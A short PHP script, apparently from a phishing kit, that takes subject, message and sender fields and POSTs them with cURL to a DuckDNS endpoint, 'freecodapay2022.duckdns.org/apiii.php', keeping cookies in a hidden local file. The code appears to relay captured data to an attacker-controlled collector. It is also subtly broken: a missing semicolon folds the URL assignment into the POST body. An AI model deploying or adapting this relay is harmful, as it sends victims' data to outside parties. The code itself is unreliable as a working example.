<?php 
$post = 
"subjek=".$subjek.
"&pesan=".$pesan.
"&sender=".$sender.
$url  = "http://freecodapay2022.duckdns.org/apiii.php";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/.cookies.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/.cookies.txt");   
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch);
curl_close($ch);
?>